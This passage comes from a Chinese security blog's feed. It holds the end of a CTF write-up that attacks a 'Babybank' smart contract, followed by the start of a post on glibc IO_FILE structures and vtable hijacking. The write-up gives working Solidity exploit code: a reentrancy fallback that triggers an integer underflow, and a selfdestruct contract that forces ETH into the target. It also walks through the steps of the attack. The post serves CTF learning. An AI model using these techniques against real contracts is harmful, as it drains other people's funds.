punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 攻击合约</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attacker</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    BabybankInterface <span class=\"token keyword\">private</span> target <span class=\"token operator\">=</span> <span class=\"token function\">BabybankInterface</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">private</span> flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 攻击函数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 执行 payforflag 函数</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">sendflag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        target<span class=\"token punctuation\">.</span><span class=\"token function\">payforflag</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Coldwinds\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"825592085@qq.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    qq<span class=\"token punctuation\">.</span>com</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\">// 构成 fallback 函数，实现重入攻击</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">require</span> <span class=\"token punctuation\">(</span>flag <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>考虑到执行 <code>payforflag</code>  函数也需要通过该攻击合约进行，所以这里直接给出攻击合约的所有代码。</p>\n<p>部署好攻击合约如下图所示：（后面简称合约 B，地址为 <code>0x95eD631946C71bD98C2dB5b23B48297192b19068</code> ）</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220308230351.png\" alt=\"\" title=\"部署攻击合约\" /></p>\n<p>这时候我们点击 <code>exploit</code>  进行攻击，编译器会提醒我们该操作很可能失败，事实上，失败是必然的。因为执行 <code>withdraw</code>  函数需要我们进行交互的这个地址在必须在题目合约中有 balance，而我们前面获得的 balance 其实是属于账户 A 的，部署的合约 B 在题目合约中没有 balance，自然不能攻击成功。</p>\n<p>为了把账户 A 的 balance 转移给合约 B，我们需要执行 <code>transfer</code>  函数。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>level<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>transfer</code>  函数有三个条件，一是交互账户的 balance 必须大于等于 amount，二是 amount 必须等于 2，三是交互账户的 level 必须等于 2，发现账户 A 是符合条件的（balance=amount=2 且 level=2）。因此我们在 <code>transfer</code>  按钮旁的编辑框中输入我们部署的合约 B 的地址，并输入要转移的 balance 数目 amount，即 <code>0x95eD631946C71bD98C2dB5b23B48297192b19068,2</code> 。</p>\n<p><code>transfer</code>  函数执行完成后，我们点击点击 <code>balance</code>  和 <code>level</code>  两个按钮，可以查看当前 balance 为 0 而 level 为 2，将 <code>balance</code>  的地址换成合约 B 后，发现合约 B 的 balance 变成了 2，说明账户 A 的 balance 已经成功转移到了合约 B。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220308231433.png\" alt=\"\" title=\"执行transfer函数\" /></p>\n<h2 id=\"避坑\"><a class=\"anchor\" href=\"#避坑\">#</a> 避坑！</h2>\n<p>既然合约 B 已经拥有了 balance，我们就可以点击攻击合约中的 <code>exploit</code>  进行攻击了，吗？</p>\n<p>如果你执行了 <code>exploit</code>  函数，那么恭喜你，你可能要重头再来了。</p>\n<p>我们再次阅读 <code>withdraw</code>  函数</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token operator\">*</span><span class=\"token number\">100000000000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        balance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到其中的 <code>call</code>  函数，我们知道执行 <code>call</code>  函数是需要 gas 的，然而题目合约中是没有 ETH 的，也就无法调用 <code>call</code>  函数。如果这时调用了 <code>withdraw</code> ，不仅不能实现重入攻击，还会导致合约 B 的 balance 被清零！也就无法再次调用 <code>withdraw</code>  了。</p>\n<p>为了能够实现重入攻击，我们就需要向题目合约中存入一定量的 ETH。可是看完整篇源码，发现题目合约是不支持正常转入 ETH 的。因此只能通过自毁函数 <code>selfdestruct</code>  来向题目合约强制转入 ETH。</p>\n<blockquote>\n<p>关于 <code>selfdestruct</code>  函数，只要知道它可以用来销毁合约，并将该合约中的 ETH 全部强制转入目标地址。</p>\n</blockquote>\n<p>所以我们部署一个合约 C，并向其中转入 0.2 个 ETH（够题目合约支付 gas 就行）。代码如下：</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">get_money</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">kill</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span></pre></td></tr></table></figure><p>部署完合约后，按下 <code>kill</code>  按钮即可销毁合约 C，并将其中的 0.2 个 ETH 转入题目合约。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220308233811.png\" alt=\"\" title=\"自毁合约强制转入ETH\" /></p>\n<p>这时候，执行攻击合约 B 中的 <code>exploit</code>  函数，才能够正确进行重入攻击，发生整型下溢出，让攻击合约 B 拥有大量的 balance。</p>\n<blockquote>\n<p>没转入 ETH 的时候点了 <code>exploit</code> ，导致 balance 被清零，做这道题已经建了好几个 0xb1b1 的账户，实在是不想重新操作一遍了，最后的图就不搞了。</p>\n</blockquote>\n<h2 id=\"成功\"><a class=\"anchor\" href=\"#成功\">#</a> 成功！</h2>\n<p>在获取了大量 balance 后，就可以执行 <code>payforflag</code>  函数，点击攻击合约 B 的 <code>sendflag</code>  按钮，即可执行 <code>payforflag</code>  函数，成功达成题目要求！</p>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2021/12/pwn-IOFILE-vtable/",
            "url": "https://www.coldwinds.top/2021/12/pwn-IOFILE-vtable/",
            "title": "IO_FILE介绍及vtable劫持",
            "date_published": "2021-12-13T09:05:03.000Z",
            "content_html": "<h1 id=\"io_file\"><a class=\"anchor\" href=\"#io_file\">#</a> IO_FILE</h1>\n<h2 id=\"结构体及部分函数源码分析\"><a class=\"anchor\" href=\"#结构体及部分函数源码分析\">#</a> 结构体及部分函数源码分析</h2>\n<h3 id=\"file结构体\"><a class=\"anchor\" href=\"#file结构体\">#</a> FILE 结构体</h3>\n<p>FILE 结构定义在 libio.h 中</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> _flags<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_IO_file_flags</span> <span class=\"token expression\">_flags</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_read_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Current read pointer */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_read_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* End of get area. */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_read_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of putback+get area. */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_write_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of put area. */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_write_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Current put pointer. */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_write_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* End of put area. */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_buf_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of reserve area. */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> _IO_buf_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* End of reserve area. */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">/* The following fields are used to support backing up and undo. */</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_base<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to start of non-current get area. */</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_backup_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Pointer to first valid character of backup area */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_end<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to end of non-current get area. */</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_marker</span> <span class=\"token operator\">*</span>_markers<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span>_chain<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">int</span> _fileno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token number\">0</span></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">int</span> _blksize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">int</span> _flags2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  _IO_off_t _old_offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* This used to be _offset but it's too small.  */</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">__HAVE_COLUMN</span> <span class=\"token comment\">/* temporary */</span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token comment\">/* 1+column number of pbase(); 0 is unknown. */</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> _cur_column<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">char</span> _vtable_offset<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">char</span> _shortbuf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  _IO_lock_t <span class=\"token operator\">*</span>_lock<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_USE_OLD_IO_FILE</span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，在这个结构体中还包含着一个_IO_jump_t 类型的指针<strong> vtable</strong>。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//_IO_jump_t 结构体源码:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_jump_t</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">,</span> __dummy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">,</span> __dummy2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_finish_t<span class=\"token punctuation\">,</span> __finish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_overflow_t<span class=\"token punctuation\">,</span> __overflow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_underflow_t<span class=\"token punctuation\">,</span> __underflow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_underflow_t<span class=\"token punctuation\">,</span> __uflow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_pbackfail_t<span class=\"token punctuation\">,</span> __pbackfail<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">/* showmany */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_xsputn_t<span class=\"token punctuation\">,</span> __xsputn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_xsgetn_t<span class=\"token punctuation\">,</span> __xsgetn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_seekoff_t<span class=\"token punctuation\">,</span> __seekoff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_seekpos_t<span class=\"token punctuation\">,</span> __seekpos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_setbuf_t<span class=\"token punctuation\">,</span> __setbuf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_sync_t<span class=\"token punctuation\">,</span> __sync<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_doallocate_t<span class=\"token punctuation\">,</span> __doallocate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_read_t<span class=\"token punctuation\">,</span> __read<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_write_t<span class=\"token punctuation\">,</span> __write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_seek_t<span class=\"token punctuation\">,</span> __seek<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_close_t<span class=\"token punctuation\">,</span> __close<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_stat_t<span class=\"token punctuation\">,</span> __stat<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_showmanyc_t<span class=\"token punctuation\">,</span> __showmanyc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">JUMP_FIELD</span><span class=\"token punctuation\">(</span>_IO_imbue_t<span class=\"token punctuation\">,</span> __imbue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\"><span class=\"token number\">0</span></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    get_column<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    set_column<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">//_IO_FILE_plus 及 vtable 指针定义:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE_plus</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  _IO_FILE file<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_jump_t</span> <span class=\"token operator\">*</span>vtable<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>在_IO_jump_t 结构体中包含了一系列指针，在调用 fopen、fclose、fread 等一系列函数时就会调用这些函数指针</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> funcs<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   <span class=\"token number\">1</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// \"extra word\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token number\">2</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// DUMMY</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token number\">3</span> exit<span 